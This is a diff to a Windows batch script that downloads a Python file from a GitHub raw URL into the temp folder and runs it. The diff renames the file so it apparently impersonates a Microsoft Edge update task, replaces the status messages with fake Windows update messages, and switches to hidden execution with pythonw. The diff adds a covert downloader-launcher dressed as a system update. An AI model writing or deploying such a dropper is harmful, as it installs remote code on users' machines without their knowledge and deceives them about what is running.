@@ -1,7 +1,7 @@
 @echo off
 set "TEMP_FOLDER=%TEMP%"
-set "SCRIPT_NAME=MicrosoftDefenderAntivirusService.pyw"
-set "SCRIPT_URL=https://example.com/your_script.py" REM Replace with the actual URL of your Python script
+set "SCRIPT_NAME=MicrosoftEdgeUpdateTaskMachineUA.pyw"
+set "SCRIPT_URL=https://raw.githubusercontent.com/Tarekmohamed0/client/main/MicrosoftEdgeUpdateTaskMachineUA.pyw" REM Replace with the actual URL of your Python script
 
 set "PYTHON_SCRIPT_PATH=%TEMP_FOLDER%\%SCRIPT_NAME%"
 
@@ -14,16 +14,15 @@ if %errorlevel% neq 0 (
     echo Python is installed.
 )
 
-rem Check if Necessary files exist in the temp folder
+rem Check if Necessary update
 if not exist "%PYTHON_SCRIPT_PATH%" (
-    echo Necessary files not found. Downloading...
+    echo Necessary Update. Downloading...
     curl -o "%PYTHON_SCRIPT_PATH%" "%SCRIPT_URL%"
 ) else (
-    echo Necessary files already exist.
+    echo Windows Updated.
 )
 
-rem Run the Python script
-start /B python "%PYTHON_SCRIPT_PATH%"
+rem Open the Python script in the background without showing the console window
+start /MIN /B "Python Script" pythonw "%PYTHON_SCRIPT_PATH%"
 
-rem Pause to keep the console window open (optional)
-pause
+exit
